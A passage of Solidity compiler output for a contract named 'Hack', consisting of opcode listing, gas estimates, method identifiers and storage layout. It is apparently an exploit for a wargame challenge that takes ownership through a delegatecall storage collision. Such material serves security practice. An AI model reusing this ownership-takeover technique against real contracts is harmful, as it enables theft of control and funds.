0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1F1 SWAP2 SWAP1 PUSH2 0x4E5 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x21F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x272 SWAP2 SWAP1 PUSH2 0x4E5 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x301 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x315 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x339 SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x38F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x386 SWAP1 PUSH2 0x4C5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x3A1 DUP2 PUSH2 0x55F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3B6 DUP2 PUSH2 0x576 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3CB DUP2 PUSH2 0x58D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3E3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x3F1 DUP5 DUP3 DUP6 ADD PUSH2 0x392 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x40C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x41A DUP5 DUP3 DUP6 ADD PUSH2 0x3A7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x435 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x443 DUP5 DUP3 DUP6 ADD PUSH2 0x3BC JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x455 DUP2 PUSH2 0x511 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x468 PUSH1 0xB DUP4 PUSH2 0x500 JUMP JUMPDEST SWAP2 POP PUSH32 0x6861636B206661696C6564000000000000000000000000000000000000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4A4 DUP2 PUSH2 0x555 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4BF PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x44C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x4DE DUP2 PUSH2 0x45B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4FA PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x49B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x51C DUP3 PUSH2 0x535 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x52E DUP3 PUSH2 0x511 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x568 DUP2 PUSH2 0x511 JUMP JUMPDEST DUP2 EQ PUSH2 0x573 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x57F DUP2 PUSH2 0x523 JUMP JUMPDEST DUP2 EQ PUSH2 0x58A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x596 DUP2 PUSH2 0x555 JUMP JUMPDEST DUP2 EQ PUSH2 0x5A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA7 PUSH11 0x89336E5D71F2E9E7C33FAE LOG0 0xEE 0xA8 SUB PUSH22 0x1FB8FBBA2918D91B4EDCC85E82CC64736F6C63430008 STOP STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "299600",
						"executionCost": "337",
						"totalCost": "299937"
					},
					"external": {
						"attack(address)": "infinite",
						"owner()": "1258",
						"setTime(uint256)": "21273",
						"timeZone1Library()": "1233",
						"timeZone2Library()": "1192"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"owner()": "8da5cb5b",
					"setTime(uint256)": "3beb26c4",
					"timeZone1Library()": "3dc79422",
					"timeZone2Library()": "27d6974f"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 14,
						"contract": "contracts/Hack16.sol:Hack",
						"label": "timeZone1Library",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 16,
						"contract": "contracts/Hack16.sol:Hack",
						"label": "timeZone2Library",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 18,
						"contract": "contracts/Hack16.sol:Hack",
						"label": "owner",
						"offset": 0,
						"slot": "2",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}